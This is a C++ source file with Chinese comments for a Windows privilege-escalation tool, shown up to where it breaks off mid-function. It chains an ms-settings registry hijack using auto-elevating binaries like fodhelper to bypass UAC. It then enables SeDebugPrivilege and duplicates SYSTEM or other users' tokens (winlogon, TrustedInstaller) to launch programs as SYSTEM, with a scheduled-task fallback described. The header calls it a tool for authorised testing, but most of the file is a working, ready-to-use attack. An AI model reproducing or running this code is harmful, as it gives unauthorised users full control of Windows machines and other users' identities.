// allbypass.cpp
//
// 用途:一条命令完成「标准用户 -> 高完整性管理员 -> NT AUTHORITY\SYSTEM」两级提权,
//       用于本地授权测试。合并了 uacbypass 与 systembypass 两条链路。
//
// 阶段划分(依靠自身权限判定自动切换,无需额外参数):
//
//   阶段 0  非管理员
//     ms-settings 注册表劫持 + 自动提权白名单程序(fodhelper 等)拿到高完整性管理员,
//     并以管理员身份重启自己进入阶段 1。
//       HKCU\Software\Classes\ms-settings\Shell\Open\command
//         (默认值)        = "<自身路径>" <原始参数...>
//         DelegateExecute = ""
//
//   阶段 1  已是管理员
//     开启 SeDebugPrivilege -> 复制 SYSTEM 进程(默认 winlogon.exe)的令牌
//     -> CreateProcessWithTokenW 以 SYSTEM 身份拉起目标程序。
//     主路线失败时可用 --fallback 改走 schtasks 建 SYSTEM 计划任务。
//
// 用法:
//   allbypass.exe [软件 [参数...]] [选项]
//
// 选项:
//   --method=<fodhelper|computerdefaults|slui|ms-settings|auto>  UAC 手法,默认 auto
//   --target=<进程名>  令牌窃取目标,默认 winlogon.exe
//   --fallback         令牌窃取失败时改用 schtasks 兜底
//   --force-fallback   强制只走 schtasks 兜底(用于单独验证该路线)
//   --verify           自动验证是否拿到 SYSTEM
//   --verify-uac       只验证到管理员即停止(不继续提 SYSTEM)
//   --stop-at-admin    只提到管理员,不提 SYSTEM
//   --keep             保留注册表劫持项与计划任务(便于观察/取证)
//   --list             列出可用 UAC 手法
//   --help             显示本帮助
//
// 示例:
//   allbypass.exe                          # 一路提到 SYSTEM,打开 powershell
//   allbypass.exe --verify                 # 一路提到 SYSTEM 并自动验证
//   allbypass.exe --stop-at-admin --verify-uac   # 只验证到管理员
//   allbypass.exe cmd.exe /k whoami        # 以 SYSTEM 身份运行指定命令行

#include <windows.h>
#include <sddl.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <winsvc.h>

#include <cstdarg>
#include <cstdio>
#include <cstring>
#include <cwctype>
#include <string>
#include <vector>

namespace {

// ---------------------------------------------------------------------------
// 常量
// ---------------------------------------------------------------------------

constexpr char REG_KEY_MS_SETTINGS[] = "Software\\Classes\\ms-settings";
constexpr char REG_KEY_COMMAND[] = "Software\\Classes\\ms-settings\\Shell\\Open\\command";

/** 目标程序省略时的默认值。

 *  用完整路径而不是 "powershell.exe":SYSTEM 令牌拉起的新进程环境块与当前进程一致,
 *  但显式路径能避免任何 PATH 解析歧义(naked 名字在某些服务上下文里找不到)。
 */
constexpr wchar_t DEFAULT_TARGET_SOFTWARE[] =
    L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";

/** 默认令牌窃取目标。winlogon 传统上不在 PPL 名单内,是首选。 */
constexpr wchar_t TARGET_PROCESS_DEFAULT[] = L"winlogon.exe";

/** ms-settings 劫持写入后、清理前的等待。 */
constexpr DWORD CLEANUP_DELAY_MS = 1500;

/** --verify 等待结果落盘的最长时间。 */
constexpr DWORD VERIFY_TIMEOUT_MS = 10000;

/** --verify 轮询间隔。 */
constexpr DWORD VERIFY_POLL_MS = 250;

/** 计划任务名前缀与启动时刻。 */
constexpr char TASK_NAME_PREFIX[] = "allbypass_";
constexpr wchar_t TASK_START_TIME[] = L"23:59";

/** 验证产物文件名。 */
constexpr char VERIFY_FILE_SYSTEM[] = "allbypass_verify_system.txt";
constexpr char VERIFY_FILE_ADMIN[] = "allbypass_verify_admin.txt";

/** 令牌清单落盘文件名。

 *  提权后的实例由 fodhelper 在**独立控制台**里启动,看不到调用方的终端,
 *  因此清单额外落一份盘,保证结果一定取得到。
 */
constexpr char TOKEN_LIST_FILE[] = "allbypass_tokens.txt";

/** 判定"SID 属于 SYSTEM / 管理员"用的特征串。 */
constexpr char SID_LOCAL_SYSTEM[] = "S-1-5-18";
constexpr char SID_BUILTIN_ADMINS[] = "S-1-5-32-544";
/** 高完整性级别的 SID,用于 --verify-uac。 */
constexpr char SID_HIGH_INTEGRITY[] = "S-1-16-12288";

struct Result {
    bool success;
    const char *error;
};

inline Result ok() { return {true, nullptr}; }
inline Result fail(const char *reason) { return {false, reason}; }

// ---------------------------------------------------------------------------
// 输出
// ---------------------------------------------------------------------------

/** 把 UTF-8 文本输出到 stdout。

 *  控制台场景走 WriteConsoleW(直接喂 UTF-16),由控制台按自身设置渲染。
 *  这比"查 GetConsoleOutputCP 再转码"可靠得多 —— 那种做法在 GBK 控制台与
 *  UTF-8 终端(chcp 65001 / Windows Terminal)混用时会输出乱码。
 *  非控制台(重定向到文件或管道)则原样写 UTF-8 字节。
 *  另外刻意不改动 SetConsoleOutputCP:那是控制台窗口的全局状态,会残留给调用方。
 */
void writeConsole(const char *utf8) {
    const HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD consoleMode = 0;
    const bool isConsole = hOut != nullptr && hOut != INVALID_HANDLE_VALUE
                           && GetConsoleMode(hOut, &consoleMode) != 0;

    if (!isConsole) {
        std::fputs(utf8, stdout);
        return;
    }

    const int wideLen = MultiByteToWideChar(CP_UTF8, 0, utf8, -1, nullptr, 0);
    if (wideLen <= 1) {
        return;
    }
    std::wstring wide(static_cast<size_t>(wideLen), L'\0');
    MultiByteToWideChar(CP_UTF8, 0, utf8, -1, wide.data(), wideLen);

    DWORD written = 0;
    WriteConsoleW(hOut, wide.data(), static_cast<DWORD>(wideLen - 1), &written, nullptr);
}

/** 宽字符串转 UTF-8。 */
std::string toUtf8(const wchar_t *wide) {
    if (!wide) {
        return {};
    }
    const int need = WideCharToMultiByte(CP_UTF8, 0, wide, -1, nullptr, 0, nullptr, nullptr);
    if (need <= 1) {
        return {};
    }
    std::string out(static_cast<size_t>(need - 1), '\0');
    WideCharToMultiByte(CP_UTF8, 0, wide, -1, out.data(), need, nullptr, nullptr);
    return out;
}

/** 判断一个宽字符是否占两列(东亚宽字符)。 */
bool isWideChar(wchar_t c) {
    const unsigned int u = static_cast<unsigned int>(c);
    return (u >= 0x1100 && u <= 0x115F) || (u >= 0x2E80 && u <= 0xA4CF) ||
           (u >= 0xAC00 && u <= 0xD7A3) || (u >= 0xF900 && u <= 0xFAFF) ||
           (u >= 0xFE30 && u <= 0xFE6F) || (u >= 0xFF00 && u <= 0xFF60) ||
           (u >= 0xFFE0 && u <= 0xFFE6);
}

/** 按**显示宽度**把 UTF-8 字符串左对齐补齐到指定列数。

 *  不能用 printf 的 %-Ns:那个按字节数补齐,而中文在 UTF-8 里占 3 字节却只占 2 列,
 *  结果整列错位,看起来就像乱码。
 */
std::string padToDisplayWidth(const std::string &utf8, size_t width) {
    std::string out = utf8;
    const int wideLen = MultiByteToWideChar(CP_UTF8, 0, utf8.c_str(), -1, nullptr, 0);
    if (wideLen > 1) {
        std::wstring wide(static_cast<size_t>(wideLen), L'\0');
        MultiByteToWideChar(CP_UTF8, 0, utf8.c_str(), -1, wide.data(), wideLen);

        size_t columns = 0;
        for (size_t i = 0; i + 1 < wide.size(); ++i) {
            columns += isWideChar(wide[i]) ? 2 : 1;
        }
        if (columns < width) {
            out.append(width - columns, ' ');
        }
    }
    return out;
}

/** ASCII 窄串转宽串(用于文件名常量)。 */
std::wstring widenAscii(const char *ascii) {
    std::wstring out;
    for (const char *p = ascii; p && *p != 0; ++p) {
        out += static_cast<wchar_t>(*p);
    }
    return out;
}

/** UTF-8 转系统 ANSI 代码页。

 *  劫持注册表项是交给 Windows 命令行解释器执行的,它按 **ANSI(系统代码页)** 读取
 *  REG_SZ 内容。若写入 UTF-8,含中文的路径(例如 %TEMP% 在中文用户名下)会变成乱码,
 *  导致重定向目标或程序路径解析失败 —— 表现为"命令似乎执行了但没有任何产物"。
 */
std::string utf8ToAnsi(const char *utf8) {
    const int wideLen = MultiByteToWideChar(CP_UTF8, 0, utf8, -1, nullptr, 0);
    if (wideLen <= 0) {
        return utf8;
    }
    std::wstring wide(static_cast<size_t>(wideLen), L'\0');
    MultiByteToWideChar(CP_UTF8, 0, utf8, -1, wide.data(), wideLen);

    const int ansiLen = WideCharToMultiByte(CP_ACP, 0, wide.c_str(), -1, nullptr, 0, nullptr,
                                            nullptr);
    if (ansiLen <= 1) {
        return utf8;
    }
    std::string ansi(static_cast<size_t>(ansiLen), '\0');
    WideCharToMultiByte(CP_ACP, 0, wide.c_str(), -1, ansi.data(), ansiLen, nullptr, nullptr);
    return ansi.substr(0, static_cast<size_t>(ansiLen - 1));
}

/** 阶段 1 的日志文件句柄(未打开时为 nullptr)。

 *  提权后的实例由 fodhelper 在**独立控制台**里启动,调用方的终端看不到它的输出,
 *  而且那个控制台在进程结束时立刻消失 —— 出问题时完全无从定位。
 *  因此阶段 1 的日志必须同时落盘。
 */
FILE *g_stageLog = nullptr;

/** 打开阶段 1 日志文件(%TEMP%\allbypass_stage1.log)。 */
void openStageLog() {
    if (g_stageLog) {
        return;
    }
    wchar_t tempDir[MAX_PATH] = {0};
    if (GetTempPathW(MAX_PATH, tempDir) == 0) {
        return;
    }
    const std::wstring path = std::wstring(tempDir) + L"allbypass_stage1.log";
    g_stageLog = _wfopen(path.c_str(), L"wb");
}

/** 打印带时间戳的日志。同时写控制台与阶段 1 日志文件。 */
void logLine(const char *level, const char *fmt, ...) {
    char body[2048];
    va_list args;
    va_start(args, fmt);
    std::vsnprintf(body, sizeof(body), fmt, args);
    va_end(args);

    SYSTEMTIME st;
    GetLocalTime(&st);

    char line[2200];
    std::snprintf(line, sizeof(line), "[%04d-%02d-%02d %02d:%02d:%02d] [%s] %s\n", st.wYear,
                  st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, level, body);

    writeConsole(line);
    std::fflush(stdout);

    if (g_stageLog) {
        std::fputs(line, g_stageLog);
        std::fflush(g_stageLog);
    }
}

// ---------------------------------------------------------------------------
// 权限判定与特权
// ---------------------------------------------------------------------------

/** 判断令牌是否属于指定 SID 字符串描述的身份。 */
bool tokenHasSid(HANDLE hToken, WELL_KNOWN_SID_TYPE kind) {
    BYTE buf[512] = {0};
    DWORD len = 0;
    if (!GetTokenInformation(hToken, TokenUser, buf, sizeof(buf), &len)) {
        return false;
    }
    BYTE want[SECURITY_MAX_SID_SIZE] = {0};
    DWORD wantLen = sizeof(want);
    if (!CreateWellKnownSid(kind, nullptr, want, &wantLen)) {
        return false;
    }
    return EqualSid(reinterpret_cast<TOKEN_USER *>(buf)->User.Sid, want) != FALSE;
}

/** 当前进程是否已是 SYSTEM。 */
bool isSystem() {
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        return false;
    }
    const bool result = tokenHasSid(hToken, WinLocalSystemSid);
    CloseHandle(hToken);
    return result;
}

/** 当前进程是否已是管理员(BUILTIN\Administrators 的启用成员)。 */
bool isElevated() {
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    PSID adminsGroup = nullptr;
    BOOL isMember = FALSE;

    if (!AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                  DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminsGroup)) {
        return false;
    }
    const BOOL queried = CheckTokenMembership(nullptr, adminsGroup, &isMember);
    FreeSid(adminsGroup);
    return queried && isMember;
}

/** 开启当前进程的一项特权。

 *  坑点:AdjustTokenPrivileges 即使没能开启特权也返回 TRUE,
 *        必须再查 GetLastError() == ERROR_SUCCESS 才算真的成功。
 */
Result enablePrivilege(const wchar_t *privilegeName) {
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return fail("OpenProcessToken 失败");
    }

    LUID luid = {};
    if (!LookupPrivilegeValueW(nullptr, privilegeName, &luid)) {
        CloseHandle(hToken);
        return fail("LookupPrivilegeValue 失败");
    }

    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    const BOOL adjusted = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    const DWORD lastError = GetLastError();
    CloseHandle(hToken);

    if (!adjusted) {
        return fail("AdjustTokenPrivileges 调用失败");
    }
    if (lastError != ERROR_SUCCESS) {
        return fail("特权不在当前令牌中");
    }
    return ok();
}

// ---------------------------------------------------------------------------
// 阶段 0:UAC 绕过
// ---------------------------------------------------------------------------

/** 一种 UAC 绕过手法。 */
struct UacMethod {
    const char *name;
    const char *trigger;
    const char *params;
    const char *description;
};

/** 与样本 restart_as_admin_* 对应的 4 种触发方式。 */
const UacMethod UAC_METHODS[] = {
    {"fodhelper", "C:\\Windows\\System32\\fodhelper.exe", nullptr, "Windows 可选功能"},
    {"computerdefaults", "C:\\Windows\\System32\\computerdefaults.exe", nullptr, "默认应用设置"},
    {"slui", "C:\\Windows\\System32\\slui.exe", "0x2a", "激活界面"},
    {"ms-settings", "ms-settings:optional-features", nullptr, "设置 URI 协议处理器"},
};

constexpr size_t UAC_METHOD_COUNT = sizeof(UAC_METHODS) / sizeof(UAC_METHODS[0]);

/** 判断触发目标是否是协议 URI 而非文件路径。 */
bool isProtocolUri(const char *trigger) {
    const char *colon = std::strchr(trigger, ':');
    if (!colon) {
        return false;
    }
    return !(colon == trigger + 1 && (colon[1] == '\\' || colon[1] == '/'));
}

/** 写入 ms-settings 劫持项,payload 为要执行的完整命令行(UTF-8 传入)。 */
Result writeHijack(const std::string &payloadUtf8) {
    // 落盘前必须转成 ANSI:解释器按系统代码页读取该 REG_SZ。
    const std::string payload = utf8ToAnsi(payloadUtf8.c_str());

    HKEY hKey = nullptr;
    DWORD disposition = 0;

    LONG rc = RegCreateKeyExA(HKEY_CURRENT_USER, REG_KEY_COMMAND, 0, nullptr,
                              REG_OPTION_NON_VOLATILE, KEY_WRITE, nullptr, &hKey, &disposition);
    if (rc != ERROR_SUCCESS) {
        logLine("ERROR", "RegCreateKeyExA 失败 rc=%ld", rc);
        return fail("创建劫持注册表项失败");
    }

    // DelegateExecute 置空:绕过 COM 委派,迫使系统直接执行默认值。
    const char *empty = "";
    rc = RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
                        reinterpret_cast<const BYTE *>(empty), 1);
    if (rc == ERROR_SUCCESS) {
        rc = RegSetValueExA(hKey, nullptr, 0, REG_SZ, reinterpret_cast<const BYTE *>(payload.data()),
                            static_cast<DWORD>(payload.size() + 1));
    }
    RegCloseKey(hKey);

    if (rc != ERROR_SUCCESS) {
        logLine("ERROR", "写入劫持项失败 rc=%ld", rc);
        return fail("写入劫持注册表项失败");
    }
    logLine("INFO", "劫持项已写入 HKCU\\%s", REG_KEY_COMMAND);
    logLine("INFO", "  (默认值)        = %s", payloadUtf8.c_str());
    logLine("INFO", "  DelegateExecute = \"\"");
    return ok();
}

/** 整树删除劫持痕迹。 */
void removeHijack() {
    const LONG rc = RegDeleteTreeA(HKEY_CURRENT_USER, REG_KEY_MS_SETTINGS);
    if (rc == ERROR_SUCCESS) {
        logLine("INFO", "已清理劫持项");
    } else if (rc != ERROR_FILE_NOT_FOUND) {
        logLine("WARN", "清理劫持项失败 rc=%ld,请手工检查 HKCU\\%s", rc, REG_KEY_MS_SETTINGS);
    }
}

/** 拉起自动提权白名单程序。 */
Result launchTrigger(const UacMethod &method) {
    SHELLEXECUTEINFOA execInfo{};
    execInfo.cbSize = sizeof(execInfo);
    execInfo.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
    execInfo.lpVerb = "open";
    execInfo.lpFile = method.trigger;
    execInfo.lpParameters = method.params;
    execInfo.nShow = SW_SHOWNORMAL;

    if (!ShellExecuteExA(&execInfo)) {
        logLine("ERROR", "ShellExecuteExA 拉起 %s 失败,GetLastError=%lu", method.trigger,
                GetLastError());
        return fail("拉起提权触发程序失败");
    }
    logLine("INFO", "已拉起触发程序: %s %s", method.trigger, method.params ? method.params : "");

    if (execInfo.hProcess) {
        WaitForSingleObject(execInfo.hProcess, CLEANUP_DELAY_MS);
        CloseHandle(execInfo.hProcess);
    } else {
        Sleep(CLEANUP_DELAY_MS);
    }
    return ok();
}

/** 用指定手法执行一次 UAC 绕过。 */
Result tryUacMethod(const UacMethod &method, const std::string &payload, bool keepRegistry) {
    if (!isProtocolUri(method.trigger)
        && GetFileAttributesA(method.trigger) == INVALID_FILE_ATTRIBUTES) {
        logLine("WARN", "触发程序不存在,跳过: %s", method.trigger);
        return fail("触发程序不存在");
    }

    logLine("INFO", "---- 手法 %s: %s ----", method.name, method.description);

    Result r = writeHijack(payload);
    if (!r.success) {
        removeHijack();
        return r;
    }
    r = launchTrigger(method);
    if (!keepRegistry) {
        Sleep(CLEANUP_DELAY_MS);
        removeHijack();
    }
    return r;
}

// ---------------------------------------------------------------------------
// 阶段 1:令牌获取
//
// 支持任意可打开进程的令牌(不再限于 SYSTEM),例如:
//   NT AUTHORITY\SYSTEM / NT AUTHORITY\LOCAL SERVICE / NT SERVICE\TrustedInstaller
//   以及同机其他登录用户(如 DOMAIN\user)—— 只要当前管理员上下文有权打开该令牌。
// ---------------------------------------------------------------------------

/** 令牌的身份与属性快照,用于展示与筛选。 */
struct TokenInfo {
    DWORD pid;
    std::wstring processName;
    std::wstring account;    // DOMAIN\user,虚拟账户形如 NT SERVICE\TrustedInstaller
    std::wstring sidString;  // S-1-5-xx
    std::wstring integrity;  // System / High / Medium / Low / Untrusted
    DWORD sessionId;
    bool duplicable;         // 是否真的能复制(受 PPL 保护的进程不能)
};

/** SID 转字符串形式(如 S-1-5-18)。 */
std::wstring sidToString(PSID sid) {
    LPWSTR str = nullptr;
    if (!ConvertSidToStringSidW(sid, &str)) {
        return L"?";
    }
    std::wstring out(str);
    LocalFree(str);
    return out;
}

/** SID 转账户名。虚拟账户会形如 NT AUTHORITY\SYSTEM、NT SERVICE\TrustedInstaller。 */
std::wstring sidToAccount(PSID sid) {
    wchar_t name[256] = {0};
    wchar_t domain[256] = {0};
    DWORD nameLen = 256;
    DWORD domainLen = 256;
    SID_NAME_USE use = SidTypeUnknown;

    if (!LookupAccountSidW(nullptr, sid, name, &nameLen, domain, &domainLen, &use)) {
        return sidToString(sid);
    }
    if (domain[0] == L'\0') {
        return name;
    }
    return std::wstring(domain) + L"\\" + name;
}

/** 读取令牌完整性级别。 */
std::wstring tokenIntegrityLevel(HANDLE hToken) {
    BYTE buf[512] = {0};
    DWORD len = 0;
    if (!GetTokenInformation(hToken, TokenIntegrityLevel, buf, sizeof(buf), &len)) {
        return L"?";
    }

    auto *label = reinterpret_cast<TOKEN_MANDATORY_LABEL *>(buf);
    const UCHAR count = *GetSidSubAuthorityCount(label->Label.Sid);
    const DWORD rid = *GetSidSubAuthority(label->Label.Sid, static_cast<DWORD>(count - 1));

    if (rid >= SECURITY_MANDATORY_SYSTEM_RID) {
        return L"System";
    }
    if (rid >= SECURITY_MANDATORY_HIGH_RID) {
        return L"High";
    }
    if (rid >= SECURITY_MANDATORY_MEDIUM_RID) {
        return L"Medium";
    }
    if (rid >= SECURITY_MANDATORY_LOW_RID) {
        return L"Low";
    }
    return L"Untrusted";
}

/** 读取令牌的会话 ID。 */
DWORD tokenSessionId(HANDLE hToken) {
    DWORD session = 0xFFFFFFFF;
    DWORD len = 0;
    GetTokenInformation(hToken, TokenSessionId, &session, sizeof(session), &len);
    return session;
}

/** 打开某进程的令牌并读取其身份属性。令牌句柄由调用方 CloseHandle。

 *  关键:这里只申请 TOKEN_QUERY。受 PPL 保护的进程(PPL 会拒绝 TOKEN_DUPLICATE)
 *  仍然允许查询身份,所以枚举阶段必须用最小权限,否则会在清单里"凭空消失"。
 *  可复制性单独探测并记入 duplicable 字段。
 */
Result inspectToken(DWORD pid, const wchar_t *procName, HANDLE *hOutToken, TokenInfo *out) {
    // PROCESS_QUERY_LIMITED_INFORMATION 对 PPL 进程同样可用,是最小权限首选。
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess) {
        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    }
    if (!hProcess) {
        return fail("OpenProcess 失败");
    }

    HANDLE hToken = nullptr;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        CloseHandle(hProcess);
        return fail("OpenProcessToken 失败");
    }

    // 单独探测一次 TOKEN_DUPLICATE,判断这个令牌到底能不能用。
    HANDLE hProbe = nullptr;
    const bool duplicable = OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hProbe) != FALSE;
    if (hProbe) {
        CloseHandle(hProbe);
    }
    CloseHandle(hProcess);

    BYTE buf[512] = {0};
    DWORD len = 0;
    if (!GetTokenInformation(hToken, TokenUser, buf, sizeof(buf), &len)) {
        CloseHandle(hToken);
        return fail("GetTokenInformation(TokenUser) 失败");
    }
    PSID sid = reinterpret_cast<TOKEN_USER *>(buf)->User.Sid;

    if (out) {
        out->pid = pid;
        out->processName = procName ? procName : L"";
        out->account = sidToAccount(sid);
        out->sidString = sidToString(sid);
        out->integrity = tokenIntegrityLevel(hToken);
        out->sessionId = tokenSessionId(hToken);
        out->duplicable = duplicable;
    }
    *hOutToken = hToken;
    return ok();
}

/** 复制指定 PID 的令牌为主令牌。requireSystem 为真时只接受 SYSTEM 身份。

 *  注意:这里必须**自己**按 TOKEN_DUPLICATE 打开一次令牌。
 *  DuplicateTokenEx 要求源句柄具备 TOKEN_DUPLICATE 权限,而 inspectToken
 *  (供枚举/展示用)只申请 TOKEN_QUERY —— 复用它的句柄复制会直接失败。
 */
Result duplicateTokenFromPid(DWORD pid, bool requireSystem, HANDLE *hOutToken) {
    // PROCESS_QUERY_LIMITED_INFORMATION 对 PPL 进程同样可用,是最小权限首选。
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess) {
        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    }
    if (!hProcess) {
        return fail("OpenProcess 失败");
    }

    HANDLE hToken = nullptr;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        CloseHandle(hProcess);
        // 实测:被拒的原因几乎总是**目标令牌自身的 DACL** 不给 Administrators 复制权
        // (典型:TrustedInstaller),而不是进程保护 —— PPL 进程的令牌反而是可复制的。
        return fail("目标令牌不允许复制(其 DACL 未授予 Administrators TOKEN_DUPLICATE)");
    }
    CloseHandle(hProcess);

    if (requireSystem && !tokenHasSid(hToken, WinLocalSystemSid)) {
        CloseHandle(hToken);
        return fail("该进程令牌不是 SYSTEM");
    }

    HANDLE hPrimary = nullptr;
    const BOOL duped = DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, nullptr, SecurityImpersonation,
                                        TokenPrimary, &hPrimary);
    CloseHandle(hToken);
    if (!duped) {
        return fail("DuplicateTokenEx 失败");
    }
    *hOutToken = hPrimary;
    return ok();
}

/** 列出全部可打开的令牌,按 身份+完整性级别 去重(同身份只保留首个来源进程)。 */
std::vector<TokenInfo> enumerateTokens() {
    std::vector<TokenInfo> result;

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        return result;
    }

    PROCESSENTRY32W entry = {};
    entry.dwSize = sizeof(entry);
    if (Process32FirstW(hSnap, &entry)) {
        do {
            if (entry.th32ProcessID == 0 || entry.th32ProcessID == 4) {
                continue;  // System Idle / System 本身没有用户态令牌
            }

            HANDLE hToken = nullptr;
            TokenInfo info = {};
            if (!inspectToken(entry.th32ProcessID, entry.szExeFile, &hToken, &info).success) {
                continue;
            }
            CloseHandle(hToken);

            bool duplicate = false;
            for (TokenInfo &seen : result) {
                if (seen.sidString == info.sidString && seen.integrity == info.integrity) {
                    // 同一身份优先保留"可复制"的那条来源。
                    if (info.duplicable && !seen.duplicable) {
                        seen = info;
                    }
                    duplicate = true;
                    break;
                }
            }
            if (!duplicate) {
                result.push_back(info);
            }
        } while (Process32NextW(hSnap, &entry));
    }
    CloseHandle(hSnap);
    return result;
}

/** 判断令牌快照是否匹配选择器。

 *  选择器支持:账户名全名(NT SERVICE\TrustedInstaller)、账户名尾段(TrustedInstaller)、
 *              SID 字符串(S-1-5-18)、进程名(lsass.exe)。统一不区分大小写。
 */
bool tokenMatches(const TokenInfo &info, const std::wstring &selector) {
    auto lower = [](const std::wstring &s) {
        std::wstring out = s;
        for (wchar_t &c : out) {
            c = static_cast<wchar_t>(towlower(c));
        }
        return out;
    };

    const std::wstring sel = lower(selector);
    const std::wstring account = lower(info.account);

    if (account == sel || lower(info.sidString) == sel || lower(info.processName) == sel) {
        return true;
    }
    // 允许只写账户名尾段,如 "TrustedInstaller" 匹配 "NT SERVICE\TrustedInstaller"。
    const size_t pos = account.find(L'\\');
    return pos != std::wstring::npos && account.substr(pos + 1) == sel;
}

/** 启动一个服务。取得某些身份的令牌前需要它先跑起来(典型:TrustedInstaller)。 */
Result ensureServiceRunning(const std::wstring &serviceName) {
    SC_HANDLE hScm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hScm) {
        return fail("OpenSCManager 失败(需要管理员权限)");
    }
    SC_HANDLE hService = OpenServiceW(hScm, serviceName.c_str(),
                                      SERVICE_START | SERVICE_QUERY_STATUS);
    if (!hService) {
        const DWORD err = GetLastError();
        CloseServiceHandle(hScm);
        logLine("ERROR", "打开服务 %s 失败,GetLastError=%lu",
                toUtf8(serviceName.c_str()).c_str(), err);
        return fail("打开服务失败,请确认服务名");
    }

    const BOOL started = StartServiceW(hService, 0, nullptr);
    const DWORD err = GetLastError();
    CloseServiceHandle(hService);
    CloseServiceHandle(hScm);

    if (started) {
        logLine("OK", "服务 %s 已启动,等待其宿主进程出现",
                toUtf8(serviceName.c_str()).c_str());
        return ok();
    }
    if (err == ERROR_SERVICE_ALREADY_RUNNING) {
        logLine("INFO", "服务 %s 已在运行", toUtf8(serviceName.c_str()).c_str());
        return ok();
    }
    logLine("ERROR", "启动服务 %s 失败,GetLastError=%lu", toUtf8(serviceName.c_str()).c_str(),
            err);
    return fail("StartService 失败");
}

/** 按选择器查找令牌并复制成主令牌。

 *  waitMs > 0 时轮询等待 —— 刚启动的服务需要时间才会出现宿主进程。
 */
Result acquireTokenBySelector(const std::wstring &selector, DWORD waitMs, HANDLE *hOutToken,
                              TokenInfo *outInfo) {
    const DWORD deadline = GetTickCount() + waitMs;

    for (;;) {
        for (const TokenInfo &info : enumerateTokens()) {
            if (!tokenMatches(info, selector)) {
                continue;
            }
            if (!info.duplicable) {
                // 典型情况:目标令牌 DACL 不给复制权(如 TrustedInstaller)。
                logLine("WARN", "  匹配到 %s (PID=%lu) 但该令牌不允许复制",
                        toUtf8(info.account.c_str()).c_str(), info.pid);
                continue;
            }
            HANDLE hToken = nullptr;
            if (duplicateTokenFromPid(info.pid, false, &hToken).success) {
                *hOutToken = hToken;
                if (outInfo) {
                    *outInfo = info;
                }
                return ok();
            }
        }
        if (GetTickCount() >= deadline) {
            break;
        }
        Sleep(300);
    }
    return fail("没有找到可复制的匹配令牌");
}

/** 按进程名精确匹配查找 PID。 */
bool findPidByName(const wchar_t *processName, DWORD *outPid) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        return false;
    }
    PROCESSENTRY32W entry = {};
    entry.dwSize = sizeof(entry);
    bool found = false;

    if (Process32FirstW(hSnap, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, processName) == 0) {
                *outPid = entry.th32ProcessID;
                found = true;
                break;
            }
        } while (Process32NextW(hSnap, &entry));
    }
    CloseHandle(hSnap);
    return found;
}

/** 遍历进程收集可打开的 SYSTEM 令牌。

 *  stopAtFirst=true 取第一个并返回令牌;false 则全部列出并就地释放(--scan)。
 */
Result scanForSystemProcess(HANDLE *hOutToken, wchar_t *outName, size_t outNameChars,
                            bool stopAtFirst) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        return fail("CreateToolhelp32Snapshot 失败");
    }
    PROCESSENTRY32W entry = {};
    entry.dwSize = sizeof(entry);
    Result outcome = fail("没有可打开的 SYSTEM 令牌");

    if (Process32FirstW(hSnap, &entry)) {
        do {
            if (entry.th32ProcessID == 0 || entry.th32ProcessID == 4) {
                continue;  // System Idle / System 本身没有用户态令牌
            }
            HANDLE hToken = nullptr;
            if (!duplicateTokenFromPid(entry.th32ProcessID, true, &hToken).success) {
                continue;
            }
            if (stopAtFirst) {
                *hOutToken = hToken;
                wcsncpy(outName, entry.szExeFile, outNameChars - 1);
                outName[outNameChars - 1] = L'\0';
                outcome = ok();
                break;
            }
            logLine("INFO", "  %-28s PID=%-6lu", toUtf8(entry.szExeFile).c_str(),
                    entry.th32ProcessID);
            CloseHandle(hToken);
            outcome = ok();
        } while (Process32NextW(hSnap, &entry));
    }
    CloseHandle(hSnap);
    return outcome;
}

/** 用给定主令牌拉起目标程序。 */
Result createProcessWithToken(HANDLE hPrimaryToken, const std::wstring &commandLine) {
    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};

    std::wstring mutableCmd(commandLine);
    // LOGON_WITH_PROFILE 对 SYSTEM 令牌常失败,故不加载用户配置。
    if (!CreateProcessWithTokenW(hPrimaryToken, 0, nullptr, mutableCmd.data(), CREATE_NEW_CONSOLE,
                                 nullptr, nullptr, &si, &pi)) {
        const DWORD err = GetLastError();
        logLine("ERROR", "CreateProcessWithTokenW 失败,GetLastError=%lu", err);
